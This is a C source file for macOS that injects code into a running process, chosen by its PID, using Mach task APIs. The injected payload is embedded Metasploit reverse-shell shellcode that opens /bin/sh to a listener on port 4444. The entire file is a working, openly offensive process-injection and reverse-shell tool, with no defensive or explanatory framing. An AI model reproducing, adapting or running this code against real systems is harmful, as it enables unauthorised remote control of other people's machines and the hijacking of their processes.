/*
break.c -- but just for mach injection
most of the code is from 
from http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
Does not continue parent thread.  
Hint: do not inject into launchd or syslogd. :P
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <dlfcn.h>

#define STACK_SIZE 65536



int main(int ac, char ** av)
{
	mach_port_t remoteTask;
	mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
	mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
	x86_thread_state64_t remoteThreadState64;
	thread_act_t remoteThread;
	task_t pid;

/*
 * osx/x64/shell_reverse_tcp - 108 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=127.0.0.1, LPORT=4444,
 * ReverseConnectRetries=5, ReverseListenerBindPort=0,
 * ReverseAllowProxy=false, ReverseListenerThreaded=false,
 * PrependSetresuid=false, PrependSetreuid=false,
 * PrependSetuid=false, PrependSetresgid=false,
 * PrependSetregid=false, PrependSetgid=false,
 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=,
 * CMD=/bin/sh
 */

	//this does not return to the org process
	unsigned char shellcode[] =
	"\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f"
	"\x05\x49\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6"
	"\x56\x48\xbe\x00\x02\x11\x5c\x7f\x00\x00\x01\x56\x48\x89\xe6"
	"\x6a\x10\x5a\x0f\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31"
	"\xf6\x0f\x05\xb8\x5a\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31"
	"\xc0\xb8\x3b\x00\x00\x02\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e"
	"\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52\x57\x48\x89"
	"\xe6\x0f\x05";

	if (ac != 2){
		printf("usage: %s <pid>\n", av[0]);
		exit(1);
	}

	pid = atoi(av[1]);
	
	if (task_for_pid(mach_task_self(), pid, &remoteTask))
		return -1;

	if(mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
		return -1;

	if(mach_vm_allocate(remoteTask, &remoteCode64, sizeof(shellcode), VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
		return -1;

	//Write shellcode
	if(mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode, sizeof(shellcode)) != KERN_SUCCESS)
		return -1;

	if (vm_protect(remoteTask, remoteCode64, sizeof(shellcode), FALSE, VM_PROT_READ|VM_PROT_EXECUTE) != KERN_SUCCESS)
		return -1;

	memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
	remoteStack64 += (STACK_SIZE /2);
	remoteStack64 -= 8;
	
	remoteThreadState64.__rip = (u_int64_t) (vm_address_t) remoteCode64;
	remoteThreadState64.__rsp = (u_int64_t) remoteStack64;
	remoteThreadState64.__rbp = (u_int64_t) remoteStack64;
	
	if (thread_create_running(remoteTask, x86_THREAD_STATE64, (thread_state_t)&remoteThreadState64,
						  x86_THREAD_STATE64_COUNT, &remoteThread) != KERN_SUCCESS)
		return -1;

	return 0;
}

